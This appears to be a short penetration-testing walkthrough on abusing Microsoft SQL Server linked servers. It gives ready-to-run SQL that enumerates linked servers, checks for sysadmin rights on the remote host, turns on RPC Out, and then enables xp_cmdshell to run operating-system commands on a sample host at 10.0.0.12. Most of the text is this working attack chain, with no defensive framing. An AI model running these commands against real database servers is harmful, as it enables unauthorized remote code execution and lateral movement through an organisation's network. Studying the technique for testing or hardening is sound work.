

### Find the Exact Name of the Linked Server


```ruby
EXEC sp_linkedservers;
```

Look for servers where `isremote` is `0` (which means it's a linked server, not the local server). Copy the exact name from the `srvname` column (e.g., `10.0.0.12\SQLEXPRESS`).



### Verify Your Remote Privileges

For `xp_cmdshell` to be enabled, you must need sysadmin rights on the remote machine. 

You can test what privileges you have on the remote server with this command: 

```ruby
EXECUTE('SELECT system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
```

`1` is good , `0` is bad .



### Check if "RPC Out" is Enabled

**RPC Out** (Remote Procedure Call Out) must be set to `True` for that specific linked server.

you can check it with :

```ruby
SELECT name, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;
```

if it's `0` you can turn it on with : 

```ruby
EXEC sp_serveroption '10.0.0.12\SQLEXPRESS', 'rpc out', 'true';
```

Once you have confirmed:

1. The Linked Server's name.
    
2. That the link gives you `sysadmin` access on the remote box.
    
3. That `RPC Out` is enabled.



### Remote Code Execute(RCE)

```ruby
-- Enable advanced options on the linked server
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [10.0.0.12\SQLEXPRESS];
```

```ruby
-- Enable xp_cmdshell on the linked server
EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [10.0.0.12\SQLEXPRESS];
```

```ruby
-- Run a system command on the linked server
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [10.0.0.12\SQLEXPRESS];
```